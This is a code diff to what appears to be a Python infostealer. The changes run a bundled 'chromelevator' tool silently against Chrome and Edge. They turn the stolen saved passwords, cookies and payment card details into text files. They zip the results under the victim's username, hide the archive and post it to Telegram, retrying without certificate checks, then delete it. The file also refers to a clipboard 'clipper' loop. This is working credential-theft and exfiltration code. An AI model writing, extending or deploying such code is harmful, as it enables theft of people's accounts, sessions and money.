@@ -259,36 +259,34 @@ def extr_browser():
 
     os.makedirs(EXTRACT_FOLDER, exist_ok=True)
 
-    # 3a) only Chrome & Edge
-    os.makedirs(os.path.join(EXTRACT_FOLDER, "Chrome"), exist_ok=True)
-    os.makedirs(os.path.join(EXTRACT_FOLDER, "Edge"), exist_ok=True)
-    # catch-all for everything else
-    other_root = os.path.join(EXTRACT_FOLDER, "Other")
-    os.makedirs(other_root, exist_ok=True)
-
-    # run only chrome & edge through chromelevator
+    # only Chrome & Edge
     for short, keyname in (("chrome","Chrome"), ("edge","Edge")):
-        # skip if browser data folder missing
-        if not os.path.isdir(BROWSERS.get(keyname, "")):
+        src_data = BROWSERS.get(keyname, "")
+        if not os.path.isdir(src_data):
             continue
 
-        ok = run_chrome_elevator(short)
-        if not ok:
+        out_dir = os.path.join(EXTRACT_FOLDER, keyname)
+        os.makedirs(out_dir, exist_ok=True)
+
+        try:
+            subprocess.run(
+                [resource_path("chromelevator.exe"), short, "-o", out_dir],
+                check=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                creationflags=CREATE_NO_WINDOW
+            )
+        except Exception:
             with open(os.path.join(EXTRACT_FOLDER, f"{short}_elevator_error.txt"), "a") as f:
                 f.write(f"{time.ctime()}: chromelevator for {short} failed\n")
             continue
 
-        # now parse the JSON outputs
-        base_out = os.path.join(EXTRACT_FOLDER, keyname)
-        if not os.path.isdir(base_out):
-            continue
-
-        for profile in os.listdir(base_out):
-            prof_dir = os.path.join(base_out, profile)
+        # now parse each profile within out_dir
+        for profile in os.listdir(out_dir):
+            prof_dir = os.path.join(out_dir, profile)
             if not os.path.isdir(prof_dir):
                 continue
 
-            # helper to load+dump
             def json_to_txt(fn, header, fmt_line):
                 jpath = os.path.join(prof_dir, fn + ".json")
                 tpath = os.path.join(prof_dir, fn + ".txt")
@@ -304,27 +302,18 @@ def extr_browser():
                 except Exception as e:
                     with open(os.path.join(prof_dir, f"{fn}_parse_error.log"), "w") as err:
                         err.write(str(e))
-                # optionally delete JSON
                 os.remove(jpath)
 
-            # passwords.json → URL | user | pass
             json_to_txt(
-                "passwords",
-                "Passwords",
+                "passwords", "Passwords",
                 lambda e: f"{e.get('origin','')} | {e.get('username','')} | {e.get('password','')}"
             )
-
-            # cookies.json → host | name = value
             json_to_txt(
-                "cookies",
-                "Cookies",
+                "cookies", "Cookies",
                 lambda e: f"{e.get('host','')} | {e.get('name','')} = {e.get('value','')}"
             )
-
-            # payments.json → card info
             json_to_txt(
-                "payments",
-                "Payments",
+                "payments", "Payments",
                 lambda e: (
                     f"{e.get('name_on_card','')} "
                     f"{e.get('expiration_month','')}/{e.get('expiration_year','')} → "
@@ -332,7 +321,9 @@ def extr_browser():
                 )
             )
 
-
+    # catch-all for other browsers
+    other_root = os.path.join(EXTRACT_FOLDER, "Other")
+    os.makedirs(other_root, exist_ok=True)
 
 
 
@@ -458,25 +449,28 @@ def clipper_loop():
 #         time.sleep(0.5)
     
 import datetime
-
-
-import requests
+import tempfile
 from requests.exceptions import SSLError, RequestException
 
 def send_zip_to_telegram():
     zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-    zip_path = f"{zip_name}.zip"
+    # build it in the OS temp folder
+    zip_path = os.path.join(tempfile.gettempdir(), f"{zip_name}.zip")
     try:
-        # build the zip
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+        # 1) Create the ZIP
+        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
             for root, dirs, files in os.walk(EXTRACT_FOLDER):
                 for file in files:
                     if file == "system_service.exe":
                         continue
-                    file_path = os.path.join(root, file)
-                    arcname = os.path.relpath(file_path, EXTRACT_FOLDER)
-                    zipf.write(file_path, arcname)
+                    full = os.path.join(root, file)
+                    arc = os.path.relpath(full, EXTRACT_FOLDER)
+                    zipf.write(full, arc)
 
+        # 2) Hide on Windows
+        subprocess.call(f'attrib +h "{zip_path}"', shell=True)
+
+        # helper to post
         def _post(verify=True):
             with open(zip_path, "rb") as f:
                 return requests.post(
@@ -487,20 +481,20 @@ def send_zip_to_telegram():
                     verify=verify
                 )
 
-        # first try normally
+        # 3) Try with certs, then without on SSL errors
         try:
             _post(verify=True)
         except SSLError:
-            # retry once without cert verification
             _post(verify=False)
 
     except RequestException as e:
-        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as errlog:
-            errlog.write(f"Telegram request failed: {e}\n")
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as err:
+            err.write(f"Telegram request failed: {e}\n")
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as errlog:
-            errlog.write(str(e))
+        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w", encoding="utf-8") as err:
+            err.write(str(e))
     finally:
+        # 4) Cleanup
         try:
             os.remove(zip_path)
         except:
